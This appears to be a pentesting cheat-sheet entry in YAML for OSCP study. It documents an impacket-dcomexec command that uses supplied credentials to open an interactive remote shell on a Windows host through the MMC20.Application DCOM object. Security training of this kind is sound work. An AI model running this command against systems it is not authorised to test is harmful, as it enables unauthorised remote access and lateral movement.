---
command: |
  impacket-dcomexec -object MMC20 $DOMAIN/$USER:$PASSWORD@$IP
description: Interactive shell via DCOM (MMC20.Application endpoint).
os: [Linux]
category: [oscp, cli]
service: [RPC]
phase: [Exploitation]
references:
  - https://github.com/fortra/impacket
---
